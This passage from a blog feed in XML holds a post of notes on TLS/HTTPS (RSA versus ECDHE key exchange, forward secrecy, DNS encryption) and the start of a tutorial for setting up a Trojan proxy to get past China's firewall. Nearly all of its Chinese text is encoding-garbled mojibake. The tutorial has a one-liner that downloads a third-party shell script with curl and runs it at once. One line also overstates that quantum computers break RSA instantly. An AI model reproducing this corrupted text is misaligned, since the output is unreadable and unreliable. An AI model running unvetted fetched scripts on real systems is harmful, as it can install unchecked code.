¸å¿ƒæ€æƒ³åœ¨äºæ‰€æœ‰çš„å‚ä¸è€…éƒ½æ¸…æ¥šå‘ç”Ÿçš„æ¯ä¸€ä»¶äº‹ï¼Œè¿™æ ·å°±è®©å°‘æ•°åˆ«æœ‰ç”¨å¿ƒçš„äººæ‹’ä¹‹é—¨å¤–ï¼Œå³å°‘æ•°æœä»å¤šæ•°ã€‚<br>æ­£å¦‚å»ä¸­å¿ƒåŒ–æŠ€æœ¯çš„ä»£è¡¨ Git å’ŒåŒºå—é“¾ä¸€æ ·ï¼Œæ¯ä¸ªå‚ä¸è€…éƒ½æœ‰åˆ›ä¸–ä»¥æ¥çš„æ‰€æœ‰æ“ä½œè®°å½•ï¼Œå¦‚æœæœ‰äººæƒ³ä½œå¼Šï¼Œé‚£å°±è¦ç¯¡æ”¹æ‰è‡³å°‘ 51% çš„ç³»ç»Ÿæˆå‘˜æ‰ä¼šæˆåŠŸï¼Œè¿™ä¸ªæˆæœ¬æ— ç–‘æ˜¯å·¨å¤§çš„ã€‚</p></blockquote><p>åœ¨è¿™ç§å»ä¸­å¿ƒåŒ–çš„æ¨¡å¼ä¸‹ï¼Œç¼ºç‚¹ä¹Ÿæ˜¯æ˜¾è€Œæ˜“è§çš„ï¼Œå³æ¯ä¸ªäººéƒ½è¦è®°å½•æ‰€æœ‰è¢«è¯å®çš„æ¶ˆæ¯ï¼Œè€Œä¸­å¿ƒåŒ–åˆ™å¯ä»¥è®©å‚ä¸è€…è½»è£…ä¸Šé˜µã€‚ä¸–é—´å®‰å¾—ä¸¤å…¨æ³•ï¼Œè½»é‡åˆèƒ½å»ä¸­å¿ƒï¼Ÿ</p><h2 id="SSL-vs-TLS"><a href="#SSL-vs-TLS" class="headerlink" title="SSL vs TLS"></a>SSL vs TLS</h2><p>SSLä¸º TLS çš„å‰èº«ï¼Œç”±äºå®‰å…¨é—®é¢˜å·²è¢«å¼ƒç”¨ï¼Œè¯·ä½¿ç”¨ TLS 1.2 åŠä»¥ä¸Šç‰ˆæœ¬</p><h2 id="PGP-ä¸-GPG-çš„åŒºåˆ«"><a href="#PGP-ä¸-GPG-çš„åŒºåˆ«" class="headerlink" title="PGP ä¸ GPG çš„åŒºåˆ«"></a>PGP ä¸ GPG çš„åŒºåˆ«</h2><p>PGP æ˜¯å•†ä¸šè½¯ä»¶ï¼Œè€Œ GPG æ˜¯å¼€æºè½¯ä»¶ï¼ŒäºŒè€…å…·æœ‰ç›¸åŒåŠŸèƒ½ã€‚</p><p>GnuPG æ˜¯ä¸€ä¸ªæ··åˆåŠ å¯†è½¯ä»¶ç¨‹åºï¼Œå®ƒä½¿ç”¨å¸¸è§„å¯¹ç§°å¯†é’¥æé«˜åŠ å¯†é€Ÿåº¦ï¼Œä½¿ç”¨å…¬é’¥ä¾¿äºäº¤æ¢ã€‚é€šå¸¸ä½¿ç”¨ä¸€æ¬¡æ€§çš„æ”¶ä»¶äººå…¬é’¥ç”¨ä»¥åŠ å¯†ä¼šè¯ã€‚</p><h2 id="å¯¹è¯å¯†é’¥æ˜¯å®¢æˆ·ç«¯å‘é€ç»™æœåŠ¡ç«¯ï¼Œè¿˜æ˜¯æœåŠ¡ç«¯å‘é€ç»™å®¢æˆ·ç«¯ï¼Ÿ"><a href="#å¯¹è¯å¯†é’¥æ˜¯å®¢æˆ·ç«¯å‘é€ç»™æœåŠ¡ç«¯ï¼Œè¿˜æ˜¯æœåŠ¡ç«¯å‘é€ç»™å®¢æˆ·ç«¯ï¼Ÿ" class="headerlink" title="å¯¹è¯å¯†é’¥æ˜¯å®¢æˆ·ç«¯å‘é€ç»™æœåŠ¡ç«¯ï¼Œè¿˜æ˜¯æœåŠ¡ç«¯å‘é€ç»™å®¢æˆ·ç«¯ï¼Ÿ"></a>å¯¹è¯å¯†é’¥æ˜¯å®¢æˆ·ç«¯å‘é€ç»™æœåŠ¡ç«¯ï¼Œè¿˜æ˜¯æœåŠ¡ç«¯å‘é€ç»™å®¢æˆ·ç«¯ï¼Ÿ</h2><p>è¦å›ç­”è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬é¦–å…ˆè¦çŸ¥é“ï¼Œç›®å‰å¯†é’¥äº¤æ¢çš„æ–¹å¼æœ‰ä¸¤ç§ RSA å’Œ ECDHEï¼Œå¦‚ç™¾åº¦çš„è¯ä¹¦ä½¿ç”¨çš„æ˜¯ RSA ç®—æ³•ï¼Œè€Œ Google ä½¿ç”¨çš„è¯ä¹¦åˆ™æ˜¯ ECC (Elliptic Curve Cryptography)ç®—æ³•ã€‚</p><p><img src="https://tva1.sinaimg.cn/large/0082zybply1gc1c4pvyesj30qw0fktc4.jpg" alt="Baidu Cert"><br><img src="https://tva1.sinaimg.cn/large/0082zybply1gc1c3corlfj30qw0e6go0.jpg" alt="Google Cert"></p><p>å®ƒä»¬å„è‡ªçš„åŸç†å¯ä»¥æŸ¥çœ‹ä»¥ä¸‹æ•™ç¨‹èµ„æ–™ï¼š</p><blockquote><p>RSA ç®—æ³•å†…å®¹å¯ä»¥æŸ¥çœ‹ã€<a href="https://www.bilibili.com/video/av26639065" target="_blank" rel="noopener">ææ°¸ä¹è€å¸ˆ 11 åˆ†é’Ÿè®² RSA åŠ å¯†ç®—æ³•</a>ã€‘ã€ã€<a href="https://www.bilibili.com/video/av35557954" target="_blank" rel="noopener">åŸºäºæ¬§æ‹‰å‡½æ•°çš„ RSA ç®—æ³•åŠ å¯†åŸç†æ˜¯ä»€ä¹ˆ</a>ã€‘æˆ– ã€<a href="https://www.bilibili.com/video/av34660391" target="_blank" rel="noopener">RSA ç®—æ³• â€“ åŸºæœ¬åŸç†ç¯‡</a>ã€‘<br>ECCç®—æ³•å†…å®¹å¯æŸ¥çœ‹ã€<a href="https://www.bilibili.com/video/av74880228" target="_blank" rel="noopener">æ¤­åœ†æ›²çº¿åŠ å¯†ä¸å“ˆå¸Œå‡½æ•°æ˜¯ä»€ä¹ˆï¼Ÿ</a>ã€‘ä¸ã€<a href="https://www.yinchengli.com/2019/07/27/https-base/" target="_blank" rel="noopener">å†è°ˆ HTTPS</a>ã€‘</p></blockquote><p>äº†è§£äº†åŸç†åï¼Œæˆ‘ä»¬å°±å¯ä»¥å›ç­”å¯¹è¯å¯†é’¥çš„ç”Ÿæˆé—®é¢˜äº†ï¼š<br>å¯¹äº RSA ç®—æ³•æ¥è¯´ï¼Œå®ƒæ˜¯<strong>ç”±æµè§ˆå™¨ç”Ÿæˆå¯¹è¯å¯†é’¥</strong>åï¼Œç”¨æœåŠ¡å™¨çš„å…¬é’¥åŠ å¯†åå‘é€ç»™æœåŠ¡å™¨ï¼Œè¿™æ ·åŒæ–¹å°±å¾—åˆ°äº†å…±äº«å¯†é’¥ã€‚å¯¹äº ECC ç®—æ³•æ¥è¯´ï¼Œåˆ™æ˜¯é€šè¿‡åŒæ–¹äº’ç›¸å‘é€ç”Ÿæˆå¯¹è¯å¯†é’¥æ‰€éœ€å‚æ•°ï¼Œæœ€ç»ˆç”±<strong>å„è‡ªç”Ÿæˆå¯¹è¯å¯†é’¥</strong>ã€‚</p><h2 id="åœ¨-RSA-ç®—æ³•ä¸­ï¼Œä¸ºä»€ä¹ˆæ˜¯æµè§ˆå™¨ç”Ÿæˆå¯¹è¯å¯†é’¥ï¼Œä¸èƒ½æ˜¯æœåŠ¡å™¨ç”Ÿæˆå¯¹è¯å¯†é’¥å—ï¼Ÿ"><a href="#åœ¨-RSA-ç®—æ³•ä¸­ï¼Œä¸ºä»€ä¹ˆæ˜¯æµè§ˆå™¨ç”Ÿæˆå¯¹è¯å¯†é’¥ï¼Œä¸èƒ½æ˜¯æœåŠ¡å™¨ç”Ÿæˆå¯¹è¯å¯†é’¥å—ï¼Ÿ" class="headerlink" title="åœ¨ RSA ç®—æ³•ä¸­ï¼Œä¸ºä»€ä¹ˆæ˜¯æµè§ˆå™¨ç”Ÿæˆå¯¹è¯å¯†é’¥ï¼Œä¸èƒ½æ˜¯æœåŠ¡å™¨ç”Ÿæˆå¯¹è¯å¯†é’¥å—ï¼Ÿ"></a>åœ¨ RSA ç®—æ³•ä¸­ï¼Œä¸ºä»€ä¹ˆæ˜¯æµè§ˆå™¨ç”Ÿæˆå¯¹è¯å¯†é’¥ï¼Œä¸èƒ½æ˜¯æœåŠ¡å™¨ç”Ÿæˆå¯¹è¯å¯†é’¥å—ï¼Ÿ</h2><p>ç­”æ¡ˆæ˜¯å¿…é¡»ç”±æµè§ˆå™¨ç”Ÿæˆã€‚è¿™æ˜¯å› ä¸ºæœåŠ¡å™¨çš„å…¬é’¥æ˜¯ä»»ä½•äººéƒ½å¯ä»¥è·å–çš„ï¼Œå¦‚æœæœåŠ¡å™¨ç”¨ç§é’¥ç”Ÿæˆå¯¹è¯å¯†é’¥å‘é€ç»™æµè§ˆå™¨ï¼Œé‚£è¿™æ ·å…¶å®ƒç”¨æˆ·ä¹Ÿå¾ˆå®¹æ˜“è·å¾—è¿™ä¸ªå¯¹è¯å¯†é’¥ï¼Œè¿™æ ·å°±ä¼šå¯¼è‡´é€šä¿¡å†…å®¹çš„æ³„éœ²ï¼Œå¦‚æœæµè§ˆå™¨ç”¨å…¬é’¥å°†è‡ªå·±ç”Ÿæˆçš„å¯¹è¯å¯†é’¥å‘é€ç»™æœåŠ¡å™¨ï¼Œé‚£å°±åªèƒ½ç”±è¿™ä¸ªå…¬é’¥æ‰€å¯¹åº”çš„ç§é’¥è§£å¯†ï¼ˆå³ä½¿å…¬é’¥æœ¬èº«ä¹Ÿæ— æ³•è§£å¯†ï¼‰ï¼Œä»è€Œä¿è¯äº†å¯¹è¯å¯†é’¥çš„å®‰å…¨æ€§ã€‚</p><h2 id="SSL-æ¡æ‰‹è¿‡ç¨‹æ˜¯æ˜æ–‡çš„ï¼Œå¦‚æœè¿™ä¸ªè¿‡ç¨‹è¢«ç›‘å¬ï¼Œå¦‚ä½•ä¿éšœå®‰å…¨æ€§ï¼Ÿ"><a href="#SSL-æ¡æ‰‹è¿‡ç¨‹æ˜¯æ˜æ–‡çš„ï¼Œå¦‚æœè¿™ä¸ªè¿‡ç¨‹è¢«ç›‘å¬ï¼Œå¦‚ä½•ä¿éšœå®‰å…¨æ€§ï¼Ÿ" class="headerlink" title="SSL æ¡æ‰‹è¿‡ç¨‹æ˜¯æ˜æ–‡çš„ï¼Œå¦‚æœè¿™ä¸ªè¿‡ç¨‹è¢«ç›‘å¬ï¼Œå¦‚ä½•ä¿éšœå®‰å…¨æ€§ï¼Ÿ"></a>SSL æ¡æ‰‹è¿‡ç¨‹æ˜¯æ˜æ–‡çš„ï¼Œå¦‚æœè¿™ä¸ªè¿‡ç¨‹è¢«ç›‘å¬ï¼Œå¦‚ä½•ä¿éšœå®‰å…¨æ€§ï¼Ÿ</h2><p>å¦‚æœåœ¨ RSA ç®—æ³•çš„ HTTPS æ¡æ‰‹ä¸­ï¼Œæˆ‘ä»¬ç›‘å¬å¹¶ä¿å­˜æ•´ä¸ªæ¡æ‰‹è¿‡ç¨‹ä¸ç»å¯¹è¯å¯†é’¥åŠ å¯†çš„é€šä¿¡å†…å®¹ï¼Œå³ä½¿æˆ‘ä»¬æ— æ³•ç«‹åˆ»è·å–åˆ°é€šä¿¡çš„å†…å®¹ï¼Œä½†å¦‚æœæŸå¤©æˆ‘ä»¬è·å–åˆ°äº†ç§é’¥ï¼Œä»ç„¶å¯ä»¥ä½¿ç”¨è¿™æŠŠç§é’¥è§£å¯†ä¹‹å‰ä¼ é€è¿‡çš„æ‰€æœ‰æ•°æ®ï¼ˆå³ä¸æ”¯æŒå‰å‘å®‰å…¨æ€§ï¼‰ã€‚å¦ä¸€æ–¹é¢ï¼ŒRSA çš„éš¾ç‚¹åœ¨äºå¤§æ•°çš„è´¨å› æ•°åˆ†è§£ï¼Œè™½ç„¶ç›®å‰çš„ç»å…¸è®¡ç®—æœºç ´è§£å‡ ä¹ä¸å¯èƒ½ï¼Œä½†å³å°†åˆ°æ¥çš„é‡å­è®¡ç®—æœºåˆ™å¯ä»¥åœ¨ç¬é—´ç ´è§£ï¼Œå› æ­¤ RSA ä¼šæœ‰ä¸€äº›æ½œåœ¨çš„é£é™©ã€‚</p><p>è€Œ ECC ç®—æ³•ä¸ä»… Key Size æ¯” RSA å°å¾ˆå¤šï¼ˆ256 bits vs 2048 bitsï¼‰ï¼Œè€Œä¸”ECC æ˜¯ C/S å„æœ‰ä¸€å¥—å…¬ç§é’¥ï¼Œå…¶å…¬é’¥åˆæ˜¯é€šè¿‡ç§é’¥è®¡ç®—å‡ºçš„æ¤­åœ†æ›²çº¿ä¸­çš„æŸä¸ªç‚¹ï¼Œé€šè¿‡äº¤æ¢å„è‡ªçš„å…¬é’¥æ¥åå•†å¯¹è¯å¯†é’¥ï¼Œä»è€Œé¿å…äº† RSA å¯èƒ½å¯¼è‡´ç›‘å¬æ•°æ®çš„æ³„éœ²é—®é¢˜ã€‚</p><p>ECDHE ä¸ ECDSA çš„å®šä¹‰ï¼šECDHE çš„å…¨ç§°æ˜¯ Elliptic Curve Diffieâ€“Hellman key Exchange æ¤­åœ†æ›²çº¿è¿ªé - èµ«å°”æ›¼å¯†é’¥äº¤æ¢ï¼Œå®ƒæ˜¯å¯¹è¿ªé - èµ«å°”æ›¼å¯†é’¥äº¤æ¢ç®—æ³•çš„æ”¹è¿›ã€‚ECDSAçš„å…¨ç§°æ˜¯Elliptic Curve Digital Signature Algorithm æ¤­åœ†æ›²çº¿æ•°å­—ç­¾åç®—æ³•ï¼Œæ˜¯é€šè¿‡æ¤­åœ†æ›²çº¿ç®—æ³•å¯¹è¯ä¹¦è¿›è¡Œæ•°å­—ç­¾åã€‚å®ƒä»¬éƒ½æ˜¯ ECC ç®—æ³•ã€‚</p><p>ç›¸æ¯” RSA å¯†é’¥äº¤æ¢ï¼ŒDH ç”±ä¼ é€’ Premaster Scret å˜æˆäº†ä¼ é€’ DH ç®—æ³•æ‰€éœ€çš„ Parameterï¼Œç„¶ååŒæ–¹å„è‡ªç®—å‡º Premaster Secretã€‚æ‰€ä»¥åœ¨å»ºç«‹ SSL è¿‡ç¨‹ä¸­ï¼ŒClient Key Exchange æ˜¯å‘é€ Parameterï¼Œç„¶åæœåŠ¡ç«¯æ ¹æ®æ‰€éœ€å‚æ•°è®¡ç®—å‡ºå¯¹ç§°ç§é’¥ã€‚Change Cipher Spec è¡¨æ˜å®¢æˆ·ç«¯é€šçŸ¥æœåŠ¡ç«¯é‡‡ç”¨åˆšæ‰åå•†çš„å‚æ•°è¿›è¡ŒåŠ å¯†é€šä¿¡ï¼ŒæœåŠ¡ç«¯åŒæ ·è¿”å› Change Cipher Spec è¡¨æ˜å·²æ”¶åˆ°å¹¶åŒæ„åå•†å¯†é’¥ã€‚</p><p>åŠ å¯†é€šä¿¡ä¸æ•°å­—ç­¾åæ˜¯å…·æœ‰å¯¹ç§°æ€§çš„ï¼Œå³åŠ å¯†é€šä¿¡æ˜¯å…¬é’¥åŠ å¯†ï¼Œç§é’¥è§£å¯†ï¼›æ•°å­—ç­¾ååˆ™æ˜¯ç§é’¥ç­¾åï¼Œå…¬é’¥è®¤è¯ã€‚</p><h2 id="ä½¿ç”¨-HTTPS-ä¼šä½¿æˆ‘çš„ç½‘ç»œé€šä¿¡éšç§å—åˆ°ä¸¥æ ¼ä¿æŠ¤å—ï¼Ÿ"><a href="#ä½¿ç”¨-HTTPS-ä¼šä½¿æˆ‘çš„ç½‘ç»œé€šä¿¡éšç§å—åˆ°ä¸¥æ ¼ä¿æŠ¤å—ï¼Ÿ" class="headerlink" title="ä½¿ç”¨ HTTPS ä¼šä½¿æˆ‘çš„ç½‘ç»œé€šä¿¡éšç§å—åˆ°ä¸¥æ ¼ä¿æŠ¤å—ï¼Ÿ"></a>ä½¿ç”¨ HTTPS ä¼šä½¿æˆ‘çš„ç½‘ç»œé€šä¿¡éšç§å—åˆ°ä¸¥æ ¼ä¿æŠ¤å—ï¼Ÿ</h2><p>ç­”æ¡ˆæ˜¯å¦å®šçš„ã€‚å› ä¸ºåœ¨ HTTPS æ¡æ‰‹å‰ï¼Œä¼šå…ˆè¿›è¡Œ DNS çš„æ˜æ–‡æŸ¥è¯¢ï¼Œå› æ­¤ç›‘æ§è€…ä»å¯å¾—çŸ¥ç”¨æˆ·æ‰€è®¿é—®çš„ç½‘ç«™ï¼Œä½†ä¸æ¸…æ¥šæ¡æ‰‹åä¸ç½‘ç«™çš„é€šä¿¡å†…å®¹ï¼Œå› æ­¤ GFW ç»å¸¸é€šè¿‡ DNS ç›‘å¬é˜»æ–­è¿æ¥ã€‚<br><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gejpry95yuj317a0u012g.jpg" alt=""></p><p>æœªåŠ å¯†çš„ DNS é€šä¿¡ä¹Ÿå¯¼è‡´äº†å¹¿å‘Šæ³¨å…¥ã€åŸŸååŠ«æŒç­‰è¯¸å¤šå®‰å…¨é—®é¢˜ï¼Œå› æ­¤ï¼ŒDNS åŠ å¯†é€šä¿¡å‘¼ä¹‹æ¬²å‡ºã€‚ç›®å‰ï¼Œä¸»è¦æœ‰ DNS over TLSï¼ˆDoTï¼‰ä¸ DNS over HTTPSï¼ˆDoHï¼‰ä¸¤ç§æ–¹å¼ï¼ŒDoTéœ€è¦å¯ç”¨æ–°ç«¯å£ï¼Œè¿™å¯èƒ½ä½¿å¾—ç°æœ‰é˜²ç«å¢™é˜»æ­¢å®ƒï¼Œé‚£ä¹ˆç”¨æˆ·å’Œåº”ç”¨ç¨‹åºå¯èƒ½ä¼šè¯•å›¾é€€å›åˆ°æœªåŠ å¯†çš„DNSï¼Œä»è€Œå¯èƒ½å…è®¸æ”»å‡»è€…å¼ºåˆ¶ç”¨æˆ·ä½¿ç”¨ä¸å®‰å…¨çš„ç‰ˆæœ¬ã€‚DoH æœ¬è´¨ä¸Šæ˜¯ HTTPSï¼Œå› æ­¤å¯ä»¥å¤ç”¨ 443 ç«¯å£ï¼Œç›®å‰çš„å„å¤§æµè§ˆå™¨å‚å•†æ­£åœ¨å¤§åŠ›æ¨å¹¿ HTTPSï¼Œé€æ­¥åºŸé™¤ HTTPï¼Œå¦ä¸€æ–¹é¢ï¼Œä½¿ç”¨ HTTPS æ„å‘³ç€ HTTP åè®®çš„æ”¹è¿›ä¹Ÿå¯ä»¥ä½¿ DoH å—ç›Šï¼Œè¿™ä½¿å¾— HTTPS æˆä¸ºå®‰å…¨ä¼ è¾“DNSæ¶ˆæ¯çš„æœ€ä½³é€‰æ‹©ã€‚</p><p>æ›´å¤šå…³äº DNS åŠ å¯†çš„å†…å®¹ï¼Œè¯·é˜…è¯»Cloudflareåšå®¢æ–‡ç« <a href="https://blog.cloudflare.com/zh/dns-encryption-explained-zh/" target="_blank" rel="noopener">DNSåŠ å¯†è¯´æ˜ - Cloudflare</a></p><hr><h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><ol><li><a href="https://zh.wikipedia.org/wiki/%E6%A0%B9%E8%AF%81%E4%B9%A6" target="_blank" rel="noopener">æ ¹è¯ä¹¦ - ç»´åŸºç™¾ç§‘</a></li><li><a href="https://zh.wikipedia.org/wiki/%E5%85%AC%E9%96%8B%E9%87%91%E9%91%B0%E8%AA%8D%E8%AD%89" target="_blank" rel="noopener">å…¬é’¥è®¤è¯ - ç»´åŸºç™¾ç§‘</a></li><li><a href="https://zh.wikipedia.org/wiki/%E8%AF%81%E4%B9%A6%E9%A2%81%E5%8F%91%E6%9C%BA%E6%9E%84" target="_blank" rel="noopener">è¯ä¹¦é¢å‘æœºæ„ - ç»´åŸºç™¾ç§‘</a></li><li><a href="https://www.zhihu.com/question/22076666/answer/69638270" target="_blank" rel="noopener">æ¯”ç‰¹å¸æ˜¯ä»€ä¹ˆï¼Ÿ - æ±Ÿå“å°”çš„å›ç­”</a></li><li><a href="https://www.ruanyifeng.com/blog/2014/09/illustration-ssl.html" target="_blank" rel="noopener">å›¾è§£ SSL/TLS åè®®</a></li><li><a href="https://space.bilibili.com/357799727/video" target="_blank" rel="noopener">å¥½å¥‡çŒ«å­¦é™¢</a></li><li><a href="https://imququ.com/post/sth-about-switch-to-https-2.html" target="_blank" rel="noopener">å…³äºå¯ç”¨ HTTPS çš„ä¸€äº›ç»éªŒåˆ†äº«ï¼ˆäºŒï¼‰</a></li><li><a href="https://imququ.com/post/protocol-negotiation-in-http2.html" target="_blank" rel="noopener">è°ˆè°ˆ HTTP/2 çš„åè®®åå•†æœºåˆ¶</a></li><li><a href="https://imququ.com/post/how-to-decrypt-https.html" target="_blank" rel="noopener">ä¸‰ç§è§£å¯† HTTPS æµé‡çš„æ–¹æ³•ä»‹ç»</a></li><li><a href="https://www.yinchengli.com/2019/07/27/https-base/" target="_blank" rel="noopener">å†è°ˆ HTTPS - ä¼šç¼–ç¨‹çš„é“¶çŒª</a></li><li><a href="https://cjting.me/2020/03/13/rsa/" target="_blank" rel="noopener">RSA çš„åŸç†ä¸å®ç°</a></li><li><a href="https://cjting.me/2016/09/05/build-a-https-site-from-scratch/" target="_blank" rel="noopener">ä»é›¶å¼€å§‹æ­å»ºä¸€ä¸ª HTTPS ç½‘ç«™</a></li><li><a href="https://www.bisend.cn/blog/weishenmebushuzhengshuhouhaishitishibuanquan" target="_blank" rel="noopener">ä¸ºä»€ä¹ˆéƒ¨ç½²SSLè¯ä¹¦åï¼Œè¿˜æ˜¯æç¤ºä¸å®‰å…¨</a></li><li><a href="https://www.nginx.com/blog/http-strict-transport-security-hsts-and-nginx/" target="_blank" rel="noopener">HTTP Strict Transport Security (HSTS) and NGINX</a></li><li><a href="https://stackoverflow.com/questions/46413494/err-too-many-redirects-with-nginx" target="_blank" rel="noopener">Nginx é‡å®šå‘æ¬¡æ•°è¿‡å¤š</a></li><li><a href="https://www.feistyduck.com/library/openssl-cookbook/online/index.html" target="_blank" rel="noopener">Openssl Cookbook</a></li><li><a href="https://keychest.net/stories/understanding-pki-for-busy-folks" target="_blank" rel="noopener">Understanding PKI for busy folks</a></li><li><a href="https://ssl-config.mozilla.org/" target="_blank" rel="noopener">SSL Configuration Generator</a></li><li><a href="https://wiki.mozilla.org/Security/Server_Side_TLS" target="_blank" rel="noopener">Security/Server Side TLS</a></li><li><a href="https://certbot.eff.org/docs/" target="_blank" rel="noopener">Certbo Docs</a></li><li><a href="https://certbot.eff.org/" target="_blank" rel="noopener">certbotåœ¨å„ç³»ç»Ÿçš„å‘½ä»¤</a></li><li><a href="https://crt.sh/" target="_blank" rel="noopener">æŸ¥è¯¢åŸŸåä¸‹çš„æ‰€æœ‰è¯ä¹¦</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> è½¯ä»¶ç¼–ç¨‹ </category>
          
          <category> å­¦ä¹ ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tls </tag>
            
            <tag> https </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è·¨è¶Šé•¿åŸï¼Œèµ°å‘ä¸–ç•Œ</title>
      <link href="/post/across-the-great-wall/"/>
      <url>/post/across-the-great-wall/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/middle/006tNbRwly1gbjjeinq5tj30ws0jjgs0.jpg" alt=""></p><p>Across the Great Wall, we can reach every corner in the world.</p><a id="more"></a><p>ä½œä¸ºç¨‹åºå‘˜ï¼Œç»å¸¸éœ€è¦è®¿é—®ä¸€äº›ä¸å­˜åœ¨çš„ç½‘ç«™ï¼Œä¹‹å‰å·²ç»å†™è¿‡ä¸¤ç¯‡ç›¸å…³çš„å†…å®¹äº†ï¼Œåˆ†åˆ«æ˜¯<a href="https://blog.shixinyu.space/post/shadowsocks/">è‡ªå»º shadowsocks æœåŠ¡å™¨æ•™ç¨‹</a>å’Œ<a href="https://blog.shixinyu.space/post/proxy-on-terminal/">å‘½ä»¤è¡Œä¸‹ä½¿ç”¨ä»£ç†</a>ï¼Œä¸è¿‡éšç€å½¢åŠ¿çš„æ—¥ç›Šä¸¥å³»ï¼Œç»å¸¸éšç€å„ç§ä¼šè®®äº‹ä»¶å¯¼è‡´æ— æ³•æ­£å¸¸ä½¿ç”¨ï¼Œç°åœ¨ç”šè‡³è”é€šçš„ GitHub éƒ½ç»å¸¸æ— æ³•ç›´è¿ã€‚</p><p>å› ä¸ºäººä»¬å¯¹è‡ªç”±çš„æ¸´æœ›ï¼Œæ‰€ä»¥å„ç§è½¯ä»¶å±‚å‡ºä¸ç©·ï¼Œä»æ—©æœŸçš„è‡ªç”±é—¨ã€æ— ç•Œæµè§ˆï¼Œåˆ°åæ¥çš„ GoAgentã€è“ç¯ï¼Œå†åˆ°å¦‚ä»Šçš„ shadowsocksã€v2rayã€Trojanï¼Œå¯¹æŠ—åœ¨ä¸æ–­æå‡ã€‚ss ç°åœ¨å‡ ä¹å°±æ˜¯é€æ˜çš„ï¼Œæ¯å½“é‡å¤§äº‹ä»¶æ—¶ï¼Œå¤§æ‰¹ ss ç­‰è½¯ä»¶å°±æ— æ³•ä½¿ç”¨ï¼Œç»“æŸåä¼šå†ç»§ç»­å¼€æ”¾ã€‚ä¸ºäº†èƒ½æ›´åŠ ç¨³å®šçš„æä¾›æœåŠ¡ï¼Œæœ€é‡è¦çš„å°±æ˜¯ä»£ç†çš„æµé‡ä¸èƒ½è¢« GFW æ‰€è¯†åˆ«ï¼Œå› æ­¤ï¼Œv2ray+websocket+tls ä¸ Trojan å°±æ˜¯å°†ä»£ç†æµé‡ä¼ªè£…ä¸ºæ™®é€šçš„ https æµé‡ï¼Œä»è€Œé¿å…è¢«è¯†åˆ«é˜»æ–­ã€‚ä»Šå¤©æˆ‘ä»¬å°±ä½¿ç”¨ Trojan æ¥å¿«é€Ÿæ­å»ºä¸€ä¸‹ã€‚</p><h1 id="å‡†å¤‡åŸŸå"><a href="#å‡†å¤‡åŸŸå" class="headerlink" title="å‡†å¤‡åŸŸå"></a>å‡†å¤‡åŸŸå</h1><p>å°†åŸŸåä¸ VPS çš„ IP è¿›è¡Œç»‘å®šï¼Œè¯·å‹¿ä½¿ç”¨ CDNï¼</p><h1 id="ç”³è¯·è¯ä¹¦"><a href="#ç”³è¯·è¯ä¹¦" class="headerlink" title="ç”³è¯·è¯ä¹¦"></a>ç”³è¯·è¯ä¹¦</h1><blockquote><p>å¦‚æœä½¿ç”¨ç‰©ç†æœºå®‰è£…ï¼Œå¯è·³è¿‡æ­¤æ­¥éª¤ã€‚</p></blockquote><p>è¯ä¹¦çš„ç”³è¯·å¯æŸ¥çœ‹<a href="https://blog.shixinyu.space/post/get-certs-by-certbot">ä½¿ç”¨ Certbot è·å– TLS è¯ä¹¦</a></p><h1 id="æ­å»ºæœåŠ¡ç«¯"><a href="#æ­å»ºæœåŠ¡ç«¯" class="headerlink" title="æ­å»ºæœåŠ¡ç«¯"></a>æ­å»ºæœåŠ¡ç«¯</h1><h2 id="ç‰©ç†æœºå®‰è£…"><a href="#ç‰©ç†æœºå®‰è£…" class="headerlink" title="ç‰©ç†æœºå®‰è£…"></a>ç‰©ç†æœºå®‰è£…</h2><blockquote><p>å»ºè®® VPS ä½¿ç”¨æœ€æ–°ç‰ˆç³»ç»Ÿï¼Œå› ä¸ºæœ€æ–°ç‰ˆæœ¬çš„å†…æ ¸å†…ç½®äº† BBRï¼Œè¯¥å·¥å…·å°†æ”¹å–„ç½‘ç»œçŠ¶å†µï¼Œå¦‚æœéæœ€æ–°ç‰ˆæœ¬ï¼Œåˆ™æ¨èæ‰‹åŠ¨å®‰è£…ã€‚</p></blockquote><p>æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ä¸€é”®æ­å»º</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -O http<span class="variable">s:</span>//raw.githubusercontent.<span class="keyword">com</span>/atrandys/trojan/master/trojan_mult.<span class="keyword">sh</span> &amp;&amp; chmod +<span class="keyword">x</span> trojan_mult.<span class="keyword">sh</span> &amp;&amp; ./trojan_mult.<span class="keyword">sh</span></span><br></pre></td></tr></table></figure><blockquote><p>è¯¥è„šæœ¬æ¥è‡ª <a href="https://www.atrandys.com/2019/1963.html" target="_blank" rel="noopener">https://www.atrandys.com/2019/1963.html</a> ï¼Œè¯¥æ–‡ç« å·²è¢«åˆ é™¤ï¼Œä½†ä»å¯é€šè¿‡å­˜æ¡£æŸ¥çœ‹<a href="https://web.archive.org/web/20200517094840/https://www.atrandys.com/2019/1963.html" target="_blank" rel="noopener">https://web.archive.org/web/20200517094840/https://www.atrandys.com/2019/1963.html</a></p></blockquote><p>å®‰è£…å®Œæˆåæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡<code>systemctl start|stop|status trojan</code>æ¥ç®¡ç† Trojan äº†ï¼Œå¦‚æœéœ€è¦æ‰‹åŠ¨å¯åŠ¨ trojanï¼Œå¯ä»¥åœ¨å…¶é…ç½®ç›®å½•ä¸‹æ‰§è¡Œ<code>./trojan -c config.json &amp;</code></p><h2 id="Docker-å®‰è£…"><a href="#Docker-å®‰è£…" class="headerlink" title="Docker å®‰è£…"></a>Docker å®‰è£…</h2><h3 id="0-é…ç½®-config-json"><a href="#0-é…ç½®-config-json" class="headerlink" title="0. é…ç½® config.json"></a>0. é…ç½® config.json</h3><h4 id="a-åˆ›å»º-config-json-æ–‡ä»¶"><a href="#a-åˆ›å»º-config-json-æ–‡ä»¶" class="headerlink" title="a. åˆ›å»º config.json æ–‡ä»¶"></a>a. åˆ›å»º <code>config.json</code> æ–‡ä»¶</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span 